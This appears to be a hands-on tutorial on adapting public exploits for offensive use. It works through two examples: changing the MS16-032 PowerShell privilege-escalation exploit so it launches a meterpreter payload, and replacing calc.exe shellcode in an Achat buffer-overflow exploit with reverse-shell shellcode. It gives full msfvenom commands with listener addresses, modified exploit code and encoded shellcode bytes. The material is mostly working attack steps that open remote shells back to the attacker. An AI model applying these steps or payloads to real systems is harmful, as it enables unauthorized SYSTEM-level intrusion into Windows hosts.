# how to modify exploits - overview

references: great source > https://zero-day.io/

EXAMPLE 1
# Step 1: Understand what the exploit does

The first step is understanding what the exploit does. you need to have at least a high-level understanding what the exploit does. In many cases, an exploit tries to executes arbitrary code spawn a cmd window, creates a new administrator account or connects back to your listener, spawning you a remote shell.

If we analyze the MS16-032 (https://www.exploit-db.com/exploits/39719) exploit closely, we clearly see it's written in Powershell.

At the end of the exploit, we see the following code:

      # LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, "C:\Windows\System32\cmd.exe", "",
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)

This part tells us, after succesfully exploiting the MS16-032 vulnerability, the exploit executes C:\Windows\System32.cmd.exe. This would work great if we have physical access to the victim host, but as we run this exploit remotely via meterpreter, spawning a local extra instance of cmd.exe gives us no root privileges via meterpreter. We found our issue!

Now we need to modify the exploit to allow us to elevate our privileges. The easiest way to do this is by replacing C:\Windows\System32\cmd.exe with a a malicious payload .exe you created yourself with msfvenom, allowing to open a new meterpeter system shell.

# Step 2: Create your own malicious payload

To start building your own malicious payload, open a new terminal and execute the following command:

 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.95 LPORT=5555 -f exe > zeroday.exe

Let's breakdown the above command:

    msvenom (stand-alone metasploit payload generator)
    -p windows/meterpreter/reverse_tcp (specifies the type of payload you want to use in your malicious executable)
    LHOST=10.10.15.95 (your IP adress you want the victim machine to connect back to)
    LPORT=5555 (your local port you want the victim machine to connect back to)
    -f exe > zeroday.exe (specifies the type of excutable you want to generate and the output file)

Next, we start a metasploit listener with the same payload, LHOST and LPORT as you created your payload with. When our payload is executed on the victim host, a meterpreter shell with connect to our listener.


# Step 3: Modify the exploit and execute

Now we have created our own malicious zeroday.exe instead of cmd.exe, all we need to do is modify the exploit so it executes our payload instead of cmd.exe.

First, we returned to our meterpreter shell and uploaded our zeroday.exe to *C:\Users\kostas\Desktop*.

Next, we replaced C:\Windows\System32\cmd.exe with C:\Users\kostas\Desktop\zeroday.exe in the exploit and saved as a .ps1 file. We also uploaded the now modified ps1 file to *C:\Users\kostas\Desktop* on our victim host.

	# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
$CallResult = [Advapi32]::CreateProcessWithLogonW(
"user", "domain", "pass",
0x00000002, "C:\Users\kostas\Desktop\zeroday.exe", "",
0x00000004, $null, $GetCurrentPath,
[ref]$StartupInfo, [ref]$ProcessInfo)

To execute our new modified exploit, run following commands:

./zeroday.ps1
Import-Module .ps1
Invoke-MS16-032 

In the screenshot you will notice that I ran Invoke-zeroday2 instead of Invoke-MS16-032. That's because I changed the name of the function for fun as well. No need to worry about that.

If we return to our meterpreter listener, we should have a SYSTEM shell..

==========================================================

EXAMPLE 2 

# Generate your own shellcode

on a box, we found the vulnerable service achat running on port 9256, which should be vulnerable to this exploit.

After analyzing the current exploit (https://www.exploit-db.com/exploits/36025), we see in the comments (msfvenom part) that the current payload shellcode (the second part) is opening calc.exe via cmd. Wouldn't it be nice if we could spawn a reverse shell instead?

~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes
~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
~~~~~~~~~~~~~~~~~~~~~~~

To generate shellcode with the payload we like (a reverse shell connecting to our IP and port), we used msfvenom with a modified payload parameter (-p).
~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python 
~~~~~~~~~~~~~~~~~~~~~~~
The first (red) highlighted part shows our modified msfvenom command, the second (green) highlighted part shows our new generated shellcode.

Now replace the shellcode from the original exploit with your newly generated exploit code (the green highlighted part in the screenshot above) and adjust the target port and ip to your victim's.

Now, setup a listener in metasploit. Use the same payload as you defined in your payload.

Next step is executing the python exploit you've modified with your generated shellcode. It should now connect to your listener. Don't forget to CHMOD +X your exploit to make it executable.
